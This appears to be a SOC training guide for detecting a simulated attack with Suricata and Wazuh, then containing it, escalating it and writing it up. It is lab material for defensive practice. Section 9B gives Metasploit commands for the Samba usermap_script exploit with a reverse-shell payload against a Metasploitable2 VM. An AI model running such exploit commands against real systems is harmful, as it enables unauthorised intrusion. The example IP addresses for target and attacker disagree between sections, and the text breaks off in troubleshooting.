# SOC Capstone — Suricata + Wazuh

**Purpose:** GitHub-ready step‑by‑step guide for a new SOC analyst to run a full detection → triage → respond workflow using Suricata (sensor) on a Raspberry Pi (Kali) and Wazuh (Manager/Indexer/Dashboard) on a Windows machine (WSL Ubuntu). This guide assumes Metasploitable2 is the target VM and Metasploit is used for attack simulation.

---

## Table of Contents

1. Overview & goals
2. Architecture & network diagram
3. Prerequisites
4. Quick pre-checks
5. Install & configure Suricata on Raspberry Pi (Kali)
6. Install rules with `suricata-update`
7. Run Suricata (service vs manual)
8. Configure Wazuh agent to ingest Suricata `eve.json`
9. Test detection (ET test + Metasploit Samba exploit)
10. Create a Wazuh detection rule (MITRE mapping)
11. Response: Block attacker with CrowdSec
12. Escalation: Create TheHive case (100-word summary template)
13. Reporting: Google Docs (SANS style 200-word report template)
14. Briefing: 100-word manager briefing template
15. Troubleshooting & common pitfalls
16. Appendix (sample logs, rules, commands)

---

## 1. Overview & goals

Make a repeatable, documented SOC workflow so a new analyst can:

* Simulate an exploit (Metasploit → Metasploitable2)
* Detect the exploit using a network sensor (Suricata on Pi)
* Ingest alerts into Wazuh Manager/Dashboard
* Contain the attack (CrowdSec block + verification)
* Escalate to Tier 2 (TheHive) with evidence
* Produce a SANS-style report and manager briefing

---

## 2. Architecture & network diagram (logical)

```
[Attacker Kali]  <--->  [Network Switch/Bridge]  <--->  [Metasploitable2 VM]
                             |
                             +--> [Raspberry Pi (Kali) : Suricata sensor + Wazuh agent]

[Windows Host (WSL Ubuntu) : Wazuh Manager + Indexer + Dashboard]
[CrowdSec] can run on Pi or Manager depending on design
[TheHive] runs on Windows/WSL or other server for case management
```

Notes:

* Ensure sensor (Pi) sits on same L2 path or put into promiscuous mode / bridge so it sees attacker↔target traffic.

---

## 3. Prerequisites

* Metasploitable2 VM (target) — IP example: `192.168.1.101`
* Attacker: Kali Linux (can be the Pi or another host) — IP example: `192.168.1.50`
* Raspberry Pi 4 with Kali Linux (Suricata + Wazuh agent)
* Windows box with WSL (Ubuntu) running Wazuh Manager / Indexer / Dashboard
* Basic networking knowledge (interfaces, `ip a`, `ifconfig`, bridged vs NAT VM networks)

Tools used & locations:

* Suricata logs: `/var/log/suricata/eve.json`
* Wazuh agent config: `/var/ossec/etc/ossec.conf` (on Pi)
* Wazuh manager rules: `/var/ossec/etc/rules/local_rules.xml` (on manager)

---

## 4. Quick pre-checks (run before starting)

```bash
# on Pi (Kali)
ip a                  # find active interface (eth0, wlan0, ens33 etc.)
ip neigh              # discover ARP neighbors
ping -c 3 192.168.1.101  # test reachability to MS2
```

If ping fails, resolve networking (VirtualBox/VMware adapter settings) before proceeding.

---

## 5. Install & configure Suricata on Raspberry Pi (Kali)

```bash
sudo apt update
sudo apt install -y suricata suricata-update
# Confirm version
suricata --version
```

If running in a VM, identify the interface that sees attacker<->target traffic:

```bash
ip a
```

Start Suricata using that interface (recommended via systemd or manually for testing):

```bash
# Manual (useful while testing)
sudo suricata -i <iface> -l /var/log/suricata/

# As a system service (recommended)
sudo systemctl enable --now suricata
# Ensure /etc/suricata/suricata.yaml has af-packet or interface configured
sudo nano /etc/suricata/suricata.yaml
# set 'interface: <iface>' under af-packet or configure 'default-interface'
```

Important: If Suricata sees zero packets, check that the interface is correct and consider `ip link set <iface> promisc on` for promiscuous capture.

---

## 6. Install rules with `suricata-update`

Download and enable Emerging Threats (ET) rules:

```bash
sudo suricata-update update-sources
sudo suricata-update enable-source et/open
sudo suricata-update
sudo systemctl restart suricata
```

Verify rules loaded:

```bash
# show suricata status and stats
sudo tail -n 200 /var/log/suricata/stats.log
# look for lines like "rules_loaded" or "Loaded X rules"
```

Note: `suricata-update` may take a few seconds/minutes to fetch and compile rule sets.

---

## 7. Run Suricata & confirm logging

Check logs:

```bash
ls -l /var/log/suricata/
tail -f /var/log/suricata/eve.json
```

If you see only `stats` events and zeros, Suricata isn't seeing traffic — re-check interface.

---

## 8. Configure Wazuh agent to ingest Suricata `eve.json`

On the Raspberry Pi (Wazuh agent):

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Add `<localfile>` entries inside `<ossec_config>`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

Restart agent:

```bash
sudo systemctl restart wazuh-agent
```

Check agent logs to ensure forwarding:

```bash
sudo tail -f /var/ossec/logs/ossec.log
```

On Wazuh Manager, ensure incoming logs arrive (check manager logs and Kibana/Elastic indices).

---

## 9. Test detection

### A. Quick ET test

```bash
curl http://testmyids.com
# then on Pi
tail -f /var/log/suricata/eve.json
# and in Wazuh manager logs
sudo tail -f /var/ossec/logs/ossec.log
```

You should see an `alert` event in `eve.json` referencing ET or TEST signature.

### B. Real exploit (Metasploit)

On attacker machine (Kali):

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.202.138
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.41
exploit
```

Watch Suricata:

```bash
tail -f /var/log/suricata/eve.json
```

Expected event sample (eve.json alert):

```json
{
  "timestamp": "2025-09-07T14:12:10.567890+0000",
  "event_type": "alert",
  "src_ip": "192.168.1.41",
  "dest_ip": "192.168.202.138",
  "alert": {
    "signature": "ET EXPLOIT Samba usermap_script exploit attempt",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  }
}
```

---

## 10. Create a Wazuh detection rule (MITRE mapping)

On the Wazuh Manager edit `local_rules.xml`:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Add a rule to match Suricata alerts (example):

```xml
<group name="suricata,">
  <rule id="100300" level="10">
    <decoded_as>json</decoded_as>
    <field name="alert.signature">.*Samba.*</field>
    <description>Samba Exploit Attempt Detected (Suricata → Metasploitable2)</description>
    <mitre>
      <id>T1210</id>
    </mitre>
  </rule>
</group>
```

Restart manager:

```bash
sudo systemctl restart wazuh-manager
```

Now Wazuh will surface the event in the Dashboard with your rule and MITRE mapping.

---

## 11. Response: Block attacker with CrowdSec

Install CrowdSec on Pi or manager (brief install):

```bash
sudo apt install -y crowdsec
# after install, add a decision (ban) for the attacker IP
sudo cscli decisions add --ip 192.168.1.50 --type ban --duration 1h --reason "Samba exploit detected"
```

Verify block (from attacker machine):

```bash
ping -c 3 192.168.1.101  # should still reach target if only outgoing blocked
# If you blocked attacker IP on the Pi, attempt to initiate a connection to target and verify failure
```

If using a CrowdSec bouncer (iptables/nginx), ensure it's installed and connected to `cscli` decisions.

---

## 12. Escalation: TheHive case (100‑word case summary template)

**Create case in TheHive UI/API** and attach evidence (`eve.json` snippets, pcap if available).

**100-word case summary (template):**

> On 2025-09-07 at 14:12 UTC, Suricata sensor on Raspberry Pi detected an exploit attempt against Metasploitable2 (192.168.1.101) from 192.168.1.50. Signature indicates Samba usermap\_script exploitation (ET EXPLOIT). Wazuh correlated the Suricata alert and promoted to Tier 2. CrowdSec applied a temporary ban to the source IP and network isolation of the target VM was performed. Evidence attached: Suricata `eve.json` alert, Suricata `stats.log`, Metasploit console output, and a pcap of the session. Immediate action: containment and further host analysis.

**TheHive fields to fill:**

* Title: `Samba exploit attempt against Metasploitable2`
* Severity: High
* TLP: Amber/Green (depending on environment)
* Description: paste 100-word summary
* Observables: src ip, dest ip, pcap, eve.json snippet

---

## 13. Reporting: Google Docs (SANS-style 200-word report template)

Create a Google Doc using SANS incident report style. Example 200‑word report you can paste:

> **Executive Summary:** On 2025-09-07 at 14:12 UTC a network sensor detected an attempted remote exploit against an internal test server (Metasploitable2, 192.168.1.101). The attack originated from 192.168.1.50 using the Samba usermap\_script exploit. The attack was contained by applying a CrowdSec ban and isolating the VM. No lateral movement was observed. Recommendations include patching exposed services, implementing network segmentation for test VMs, and enabling host-based agents where possible.
>
> **Timeline:** 14:12 - Suricata alert generated; 14:14 - Wazuh correlated and notified SOC; 14:18 - CrowdSec applied temporary ban; 14:25 - TheHive case created and evidence attached.
>
> **Recommendations:** patch Samba or avoid exposing legacy services, deploy host-based telemetry, tune IDS rules, enforce least privilege, and schedule a post-incident review with remediation tasks assigned.

*(Adjust the text as required for your environment.)*

---

## 14. Briefing: 100-word manager summary (non-technical)

> On 2025-09-07 our monitoring detected a targeted attempt to exploit a vulnerable service on a lab machine. The intrusion attempt was blocked, the attacking IP temporarily banned, and the affected virtual machine isolated. No production systems were impacted and no sensitive data was accessed. We recommend continuing the isolation, running a short forensic check, and updating our test-environment controls to prevent accidental exposure.

---

## 15. Troubleshooting & common pitfalls

* **No alerts, only ************`stats`************ events:** Suricata is not seeing traffic. Check the interface with `ip a` and ensure the Pi sits on the traffic path. Consider `ip link set <iface> promisc on`.
* **AF\_PACKET / fanout errors:** May appear on some kernels. Options:

  * Use `-i <iface>` without af-packet (manual mode) or run Suricata on attacker host.
  * Capture with tcpdump and analyze offline: `sudo tcpdump -i <iface> host 192.168.1.41 -w ms2.pcap` then run `suricata -r ms2.pcap` on a host with Suricata/WSL.
* **suricata-update fetch errors:** 
